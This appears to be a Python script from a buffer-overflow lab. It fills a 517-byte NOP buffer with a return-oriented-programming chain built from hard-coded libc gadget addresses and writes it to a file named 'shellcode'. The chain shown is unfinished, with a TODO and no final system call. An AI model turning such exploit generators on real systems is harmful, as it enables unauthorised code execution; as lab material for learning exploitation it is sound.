#!/usr/bin/python3
import argparse
import os, sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))    # For importing ROPChain
from rop_chain import ROPChain

class GenerateShellcode:
    def __init__(self, args):
        # Fill the buffer with NOP's (x90)
        self.buffer = bytearray(b'\x90' * 517)
        self.buffer_offset = 23
        self.buffer_word_index = 0

        self.gadgets_path = args.gadgets
        self.libc_offset = int(args.libc_offset, 16)

        self.rop_chain = ROPChain(self.gadgets_path)
        self.rop_chain.parse_gadgets_file()

    def store_word(self, word):
        num_bytes = 4
        reversed_bytes = word.to_bytes(num_bytes, byteorder='little')

        for i in range(num_bytes):  # Iterate over each of the four bytes in the word
            index = self.buffer_offset + num_bytes*self.buffer_word_index + i
            self.buffer[index] = reversed_bytes[i]

        self.buffer_word_index += 1

    def store_gadget(self, gadget_str):
        libc_gadget = self.rop_chain.get_gadget(gadget_str) + self.libc_offset
        print("GADGET: " + gadget_str + " => " + hex(libc_gadget))
        self.store_word(libc_gadget)

    def get_shellcode(self):
        # TODO(samanthayu): Use libc offset
        self.store_word(0xb7e3579c)  # xor eax, eax ; ret ;
        self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;
        self.store_word(0x0b0b0b0b)
        self.store_word(self.libc_offset - 0x18)   # 0x18 is 24 in hex
        self.store_word(0xb7e34ca3)  # mov dword ptr [edx + 0x18], eax ; ret ;
        self.store_word(0xb7e688a7)  # add al, ch ; ret ;
        self.store_word(0xb7ef11c8)  # pop ebx ; ret ;
        self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;


if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser(description="Create a ROP chain using the gadgets found")
    arg_parser.add_argument("gadgets", help="File path of the gadgets returned by ROPgadget")
    arg_parser.add_argument("libc_offset", help="Offset of libc")
    args = arg_parser.parse_args()

    gen_shellcode = GenerateShellcode(args)
    gen_shellcode.get_shellcode()

    # Write the content to badfile
    file = open("shellcode", "wb")
    file.write(gen_shellcode.buffer)
    file.close()
